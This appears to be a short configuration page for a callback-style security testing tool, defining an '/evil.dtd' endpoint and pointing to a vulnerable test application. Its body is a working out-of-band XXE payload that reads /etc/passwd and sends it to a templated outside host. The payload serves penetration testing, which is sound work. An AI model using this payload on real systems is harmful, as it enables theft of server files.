---
title: XXE DTD
description: More XXE
weight: 1
pattern: /evil\.dtd$
is_final: true
data:
  headers:
    Content-Type: text/xml
  body: |-
    <!ENTITY % payl SYSTEM "file:///etc/passwd">
    <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .NotifyString }}/xxe?p=%payl;'>">

---

### /dt

A vulnerable application for testing is in [../../../../cmd/xodbox-validator](../../../../cmd/xodbox-validator)


### /evil.dtd

dtd for use by others
